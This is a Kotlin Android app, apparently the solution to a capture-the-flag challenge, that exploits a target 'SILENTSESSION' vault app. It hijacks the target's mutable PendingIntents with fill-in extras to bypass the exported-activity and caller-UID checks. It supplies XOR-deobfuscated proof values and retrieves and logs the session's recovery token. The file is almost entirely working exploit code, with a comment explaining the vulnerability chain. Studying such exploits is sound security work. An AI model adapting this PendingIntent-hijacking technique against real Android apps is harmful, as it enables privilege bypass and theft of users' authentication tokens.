package com.attacker.relay

import android.app.Activity
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import android.widget.TextView
import com.silentsession.vault.ISessionCallback
import com.silentsession.vault.ISessionService

/**
 * SILENTSESSION exploit companion.
 *
 * Vulnerability chain:
 *   1. ISessionService.step() only accepts calls where
 *      Binder.getCallingUid() == Process.myUid() (i.e. calls made
 *      *inside* the vault app's own process). An external app can
 *      never call it directly, no matter what it passes.
 *   2. The only thing that ever calls step() is RelayActivity,
 *      which is exported="false" (can't be launched directly from
 *      another app) and just forwards whatever extras it was
 *      launched with -- including an EXTRA_P field that the normal
 *      open() flow never actually sets.
 *   3. open() hands the caller 3 PendingIntents (one per slot) that
 *      target RelayActivity. They are built with
 *      FLAG_UPDATE_CURRENT|FLAG_ONE_SHOT -- no FLAG_IMMUTABLE.
 *      A mutable PendingIntent lets the holder supply a "fill-in"
 *      Intent whose extras override the original ones, and
 *      PendingIntent.send() executes with the *creator's* identity,
 *      bypassing both the exported=false check and the in-process
 *      uid check on step().
 *   4. The missing EXTRA_P value (Keys.token(slot)) is not a real
 *      secret -- it's reversible XOR-obfuscation baked into the
 *      APK's own Keys.java, so we can supply it ourselves (computed
 *      offline, see solve_offline.py).
 *
 * This lets a standard operator app walk the session through all 3
 * slots and then fetch() the recovery token as the session's owner
 * (itself).
 */
class MainActivity : Activity() {

    companion object {
        private const val TAG = "RELAY_EXPLOIT"
        private const val TARGET_PKG = "com.silentsession.vault"
        private const val TARGET_SVC = "com.silentsession.vault.service.SessionService"
        private const val ACTION_BIND = "com.silentsession.vault.action.BIND_SESSION"

        private const val EXTRA_SID = "com.silentsession.vault.x.s"
        private const val EXTRA_SLOT = "com.silentsession.vault.x.i"
        private const val EXTRA_TK = "com.silentsession.vault.x.t"
        private const val EXTRA_P = "com.silentsession.vault.x.p"

        // Recovered offline from the obfuscated Keys.java constants
        // (see solve_offline.py) -- these are NOT secrets protected
        // by anything beyond XOR obfuscation.
        private val PROOFS = arrayOf("cdf2f9c4", "d93cbea9", "62e16c0f")
    }

    private lateinit var statusView: TextView
    private var svc: ISessionService? = null

    private val callback = object : ISessionCallback.Stub() {
        override fun onEvent(id: String?, code: Int) {
            Log.i(TAG, "onEvent id=$id code=$code")
            if (code == 2) { // ST_DONE
                runOnUiThread { fetchToken(id!!) }
            }
        }
    }

    private val conn = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, binder: IBinder?) {
            svc = ISessionService.Stub.asInterface(binder)
            Log.i(TAG, "bound: " + svc?.info())
            svc?.subscribe(callback)
            runAttack()
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            svc = null
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        statusView = TextView(this).apply { setPadding(48, 96, 48, 48) }
        setContentView(statusView)
        log("binding to session service...")

        val intent = Intent(ACTION_BIND).apply {
            component = ComponentName(TARGET_PKG, TARGET_SVC)
        }
        bindService(intent, conn, Context.BIND_AUTO_CREATE)
    }

    private fun runAttack() {
        val service = svc ?: return
        val opened = service.open("x")
        val id = opened.getString("id")!!
        @Suppress("DEPRECATION")
        val relays = opened.getParcelableArrayList<PendingIntent>("h")!!
        log("session id=$id, got ${relays.size} relay PendingIntents")

        // We don't even need the baked-in TK extras -- open()'s Binder
        // *return value* already gave us tk[] indirectly via the
        // PendingIntents' own extras, but to be explicit and robust
        // we read them back off each PendingIntent's... we don't have
        // read access to a PendingIntent's extras directly, so instead
        // we just trust the original TK baked into the Intent (it's
        // already correct) and ONLY override SLOT + P, which is the
        // one field the service never filled in. Fill-in extras
        // overwrite matching keys and add missing ones.
        for (slot in 0 until relays.size) {
            val fillIn = Intent().apply {
                putExtra(EXTRA_SID, id)
                putExtra(EXTRA_SLOT, slot)
                putExtra(EXTRA_P, PROOFS[slot])
                // EXTRA_TK deliberately omitted: the PendingIntent's
                // own baked-in TK extra for this slot is already
                // correct and fill-in won't clobber it since it's
                // not present here -- but if your target build does
                // clobber it, read the corresponding tk string back
                // from open()'s String[] (exposed via a lower-level
                // transact if needed) and set EXTRA_TK explicitly too.
            }
            relays[slot].send(this, 0, fillIn)
            log("fired relay slot $slot")
            Thread.sleep(400) // let RelayActivity finish() before firing the next one
        }

        log("waiting for callback (state should flip to ST_DONE=2)...")
    }

    private fun fetchToken(id: String) {
        val token = svc?.fetch(id)
        log("RECOVERED TOKEN:\n$token")
        Log.i(TAG, "RECOVERED TOKEN: $token")
    }

    private fun log(msg: String) {
        Log.i(TAG, msg)
        runOnUiThread { statusView.append("\n$msg") }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (svc != null) unbindService(conn)
    }
}
